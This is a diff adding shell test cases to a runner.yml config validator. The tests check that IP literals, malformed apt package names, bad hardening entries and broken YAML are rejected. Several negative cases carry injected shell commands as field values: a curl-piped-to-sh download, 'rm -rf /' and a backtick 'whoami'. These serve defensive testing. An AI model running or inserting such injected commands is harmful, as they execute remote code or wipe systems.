@@ -235,6 +235,129 @@ http_egress:
 EOF
 )"
 
+# --- H8: tcp_egress IP literal rejected --------------------------------------
+check "tcp_egress with IPv4 literal rejected (H8)" 1 \
+    "IP literals are not allowed" \
+    "$(cat <<'EOF'
+runtime: node:24
+tcp_egress:
+  - 10.0.0.5:5432
+EOF
+)"
+
+check "tcp_egress with public IPv4 literal rejected (H8)" 1 \
+    "IP literals are not allowed" \
+    "$(cat <<'EOF'
+runtime: node:24
+tcp_egress:
+  - 8.8.8.8:5432
+EOF
+)"
+
+check "tcp_egress with IPv6 literal rejected (H8 — caught by host-shape regex)" 1 \
+    'expected host:port' \
+    "$(cat <<'EOF'
+runtime: node:24
+tcp_egress:
+  - "[::1]:5432"
+EOF
+)"
+
+# --- H1: apt package name validation ----------------------------------------
+check "valid apt packages accepted" 0 "" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - jq
+  - libssl3
+  - python3.11-dev
+EOF
+)"
+
+check "apt name with shell metachar rejected (H1)" 1 "package names must match Debian policy" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - "jq; curl evil.sh | sh"
+EOF
+)"
+
+check "apt name with leading dash rejected (H1)" 1 "package names must match Debian policy" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - "-y"
+EOF
+)"
+
+check "apt name with uppercase rejected (H1)" 1 "package names must match Debian policy" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - "BadPackage"
+EOF
+)"
+
+check "apt name with backtick rejected (H1)" 1 "package names must match Debian policy" "$(cat <<'EOF'
+runtime: node:24
+apt:
+  - "jq`whoami`"
+EOF
+)"
+
+# --- H2: hardening: block validation ----------------------------------------
+check "valid hardening.remove accepted" 0 "" "$(cat <<'EOF'
+runtime: node:24
+hardening:
+  remove: [curl, jq, unzip]
+EOF
+)"
+
+check "valid hardening.stub accepted" 0 "" "$(cat <<'EOF'
+runtime: node:24
+hardening:
+  stub: [curl, jq]
+EOF
+)"
+
+check "valid mixed remove + stub accepted" 0 "" "$(cat <<'EOF'
+runtime: node:24
+hardening:
+  remove: [unzip]
+  stub: [curl, jq]
+EOF
+)"
+
+check "hardening with shell metachar rejected (H2)" 1 "invalid tool name" "$(cat <<'EOF'
+runtime: node:24
+hardening:
+  remove: ["jq; rm -rf /"]
+EOF
+)"
+
+check "hardening with overlapping remove+stub rejected (H2)" 1 "appears in both 'remove' and 'stub'" "$(cat <<'EOF'
+runtime: node:24
+hardening:
+  remove: [curl]
+  stub: [curl]
+EOF
+)"
+
+check "hardening with unknown sub-key rejected (H2)" 1 "unknown sub-key" "$(cat <<'EOF'
+runtime: node:24
+hardening:
+  forbid_everything: true
+EOF
+)"
+
+# --- H11: malformed YAML must fail-closed (not silently pass) ----------------
+check "malformed YAML fails-closed (H11)" 1 \
+    "yq failed parsing" \
+    "$(cat <<'EOF'
+runtime: node:24
+http_egress:
+  - .npmjs.org
+  -- broken-syntax
+   bad: indent
+EOF
+)"
+
 # --- unknown top-level key rejected — exact message per spec §3.3 ------------
 check "unknown top-level key rejected" 1 \
     'runner.yml contains unknown field "banana" — your RunSecure version may be older than this config requires' \
